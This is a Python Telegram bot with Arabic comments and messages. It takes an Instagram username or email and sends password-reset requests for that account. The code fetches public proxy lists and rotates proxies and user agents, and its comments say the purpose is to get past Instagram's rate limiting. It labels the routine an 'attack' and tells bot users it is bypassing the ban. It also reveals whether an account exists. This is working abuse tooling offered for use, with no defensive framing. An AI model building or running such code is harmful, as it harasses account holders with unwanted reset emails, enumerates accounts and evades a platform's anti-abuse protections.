import os
import json
import asyncio
import logging
import requests
import random
import re
from datetime import datetime, timedelta
from bs4 import BeautifulSoup
from aiogram import Bot, Dispatcher
from aiogram.filters import Command
from aiogram.types import Message
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup

# --- الإعدادات ---
# ضع التوكن هنا بدلاً من os.getenv إذا كنت تشغله محلياً
TOKEN = os.getenv("BOT_TOKEN") 
if not TOKEN:
    print("❌ خطأ: يجب وضع توكن البوت في الكود أو في متغيرات البيئة.")
    exit()

# إعداد السجل
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# --- 1. مدير البروكسيات التلقائي (الحل الجذري للحظر) ---
class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.sources = [
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
            "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
        ]
    
    def fetch_proxies(self):
        """جلب وتحديث البروكسيات من الإنترنت"""
        logger.info("🔄 جاري تحميل قائمة بروكسيات جديدة...")
        temp_proxies = set()
        for url in self.sources:
            try:
                r = requests.get(url, timeout=10)
                if r.status_code == 200:
                    for line in r.text.splitlines():
                        if ":" in line:
                            temp_proxies.add(line.strip())
            except:
                continue
        
        self.proxies = list(temp_proxies)
        logger.info(f"✅ تم تحميل {len(self.proxies)} بروكسي جاهز للعمل.")

    def get_proxy(self):
        """إرجاع بروكسي عشوائي بتنسيق requests"""
        if not self.proxies:
            self.fetch_proxies() # محاولة تحميل إذا كانت القائمة فارغة
        
        if not self.proxies:
            return None # فشل تام في الجلب
            
        proxy = random.choice(self.proxies)
        return {
            "http": f"http://{proxy}", 
            "https": f"http://{proxy}"
        }

# تهيئة مدير البروكسيات عالمياً
proxy_manager = ProxyManager()

# --- 2. نظام إدارة المحاولات (المستخدم) ---
class RateLimiter:
    def __init__(self, filename="limits.json"):
        self.filename = filename
        self.max_attempts = 10 # رفعت الحد كما طلبت
        self.reset_hours = 24
        self.data = self._load_data()

    def _load_data(self):
        if os.path.exists(self.filename):
            try:
                with open(self.filename, 'r') as f: return json.load(f)
            except: return {}
        return {}

    def _save_data(self):
        with open(self.filename, 'w') as f: json.dump(self.data, f)

    def check_user(self, user_id):
        user_id = str(user_id)
        now = datetime.now()
        if user_id not in self.data:
            self.data[user_id] = {"count": 0, "reset_time": (now + timedelta(hours=self.reset_hours)).isoformat()}
            self._save_data()
            return True, self.max_attempts
        
        user_data = self.data[user_id]
        reset_time = datetime.fromisoformat(user_data["reset_time"])
        
        if now > reset_time:
            self.data[user_id] = {"count": 0, "reset_time": (now + timedelta(hours=self.reset_hours)).isoformat()}
            self._save_data()
            return True, self.max_attempts
        
        if user_data["count"] < self.max_attempts:
            return True, self.max_attempts - user_data["count"]
        
        return False, reset_time.strftime("%Y-%m-%d %H:%M")

    def increment_usage(self, user_id):
        user_id = str(user_id)
        if user_id in self.data:
            self.data[user_id]["count"] += 1
            self._save_data()

# --- 3. كلاس إنستجرام المطور (مع التدوير الذكي) ---
class IGResetMaster:
    def __init__(self, email):
        self.email = email.lower().strip()
        self.base_url = "https://www.instagram.com"
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
        ]

    def _extract_token(self, session, html):
        token = session.cookies.get('csrftoken')
        if token: return token
        match = re.search(r'"csrf_token":"([^"]+)"', html)
        if match: return match.group(1)
        match2 = re.search(r'csrf_token\\":\\"([^"]+)\\"', html)
        if match2: return match2.group(1)
        return None

    def attempt_single(self, proxy):
        """محاولة واحدة باستخدام بروكسي محدد"""
        session = requests.Session()
        session.proxies = proxy
        ua = random.choice(self.user_agents)
        
        session.headers.update({
            'User-Agent': ua,
            'Accept-Language': 'en-US,en;q=0.9',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Site': 'same-origin'
        })

        try:
            # الصفحة الرئيسية
            session.get(f"{self.base_url}/", timeout=10)
            
            # صفحة الريسيت
            reset_url = f"{self.base_url}/accounts/password/reset/"
            res = session.get(reset_url, timeout=10)
            
            token = self._extract_token(session, res.text)
            if not token: return False, "No Token"

            # إرسال البيانات
            headers = {
                'X-CSRFToken': token,
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': reset_url,
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Instagram-AJAX': '1'
            }
            data = {'email_or_username': self.email, 'csrfmiddlewaretoken': token}
            
            response = session.post(
                f"{self.base_url}/accounts/account_recovery_send_ajax/", 
                data=data, headers=headers, timeout=10
            )
            
            if response.status_code == 200:
                out = response.json()
                if out.get('status') == 'ok':
                    return True, "SENT"
                return False, out.get('message', 'Rejected')
            
            return False, f"Status {response.status_code}"

        except Exception as e:
            return False, "Connection Error"

    def run_smart_attack(self):
        """
        يقوم بتجربة ما يصل إلى 15 بروكسي مختلف لكل مستخدم لتجاوز الـ 429
        """
        max_retries = 15 # عدد المحاولات الداخلية لتجاوز الحظر
        errors = []
        
        for i in range(max_retries):
            proxy = proxy_manager.get_proxy()
            if not proxy:
                return False, "No Proxies Available"
            
            # تجربة البروكسي
            success, msg = self.attempt_single(proxy)
            
            if success:
                return True, "تم الإرسال بنجاح ✅"
            
            # إذا كان الخطأ حظر أو اتصال، نستمر في المحاولة مع بروكسي آخر
            errors.append(msg)
            # نتحقق إذا كان الرفض بسبب أن الإيميل غير موجود أصلاً (لا داعي لتغيير البروكسي)
            if "No users found" in msg:
                return False, "المستخدم غير موجود ❌"
        
        return False, "فشل بعد 15 محاولة (بروكسيات ضعيفة)"

# --- 4. البوت ---
class Form(StatesGroup):
    email = State()

bot = Bot(token=TOKEN)
dp = Dispatcher()
limiter = RateLimiter()

@dp.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    # تحميل البروكسيات في الخلفية عند أول تشغيل إذا كانت فارغة
    if not proxy_manager.proxies:
        asyncio.create_task(asyncio.to_thread(proxy_manager.fetch_proxies))

    allowed, info = limiter.check_user(message.from_user.id)
    if not allowed:
        return await message.answer(f"⛔️ استنفذت رصيدك اليومي. عُد في: {info}")
    
    await message.answer(
        f"👋 أهلاً {message.from_user.first_name}\n"
        "🔥 **بوت Reset Ultra - النسخة المحسنة**\n"
        "نستخدم نظام تخطي الحظر التلقائي (Auto-Proxy).\n\n"
        f"💎 محاولاتك المتبقية: {info}\n"
        "📩 أرسل اليوزر أو الإيميل الآن:"
    )
    await state.set_state(Form.email)

@dp.message(Form.email)
async def handle_email(message: Message, state: FSMContext):
    user_id = message.from_user.id
    email = message.text.strip()
    
    status_msg = await message.answer(
        "⚔️ **جاري الهجوم وتجاوز الحظر...**\n"
        "قد تستغرق العملية دقيقة للبحث عن بروكسي نظيف."
    )
    
    master = IGResetMaster(email)
    
    # تشغيل العملية الثقيلة في Thread
    success, result = await asyncio.to_thread(master.run_smart_attack)
    
    await state.clear()
    
    if success:
        limiter.increment_usage(user_id)
        await status_msg.edit_text(
            f"✅ **تم الإرسال بنجاح!**\n"
            f"👤 الحساب: `{email}`\n"
            f"🚀 الحالة: {result}\n"
            "افحص البريد الوارد أو السبام (Spam)."
        )
    else:
        # إذا فشل بعد كل المحاولات
        if "المستخدم غير موجود" in result:
             limiter.increment_usage(user_id) # نخصم لأنه خطأ مستخدم
        
        await status_msg.edit_text(
            f"❌ **فشلت العملية**\n"
            f"السبب: {result}\n"
            "جرب مرة أخرى لاحقاً."
        )

# عند بدء التشغيل
async def on_startup():
    print("🤖 Bot started...")
    print("🌍 Fetching initial proxies...")
    await asyncio.to_thread(proxy_manager.fetch_proxies)

async def main():
    # تسجيل دالة عند البدء
    dp.startup.register(on_startup)
    await dp.start_polling(bot)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Bot stopped")
